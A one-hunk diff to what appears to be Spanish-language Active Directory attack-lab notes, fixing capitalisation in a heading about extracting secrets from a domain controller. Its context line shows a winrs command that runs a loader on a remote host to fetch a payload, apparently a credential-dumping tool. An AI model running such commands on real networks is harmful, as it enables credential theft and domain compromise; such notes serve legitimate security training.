@@ -610,4 +610,4 @@ winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Safet
 
 
 *LO -08*
-## Extraer los secrets de un DOmain COntroller
+## Extraer los secrets de un Domain COntroller
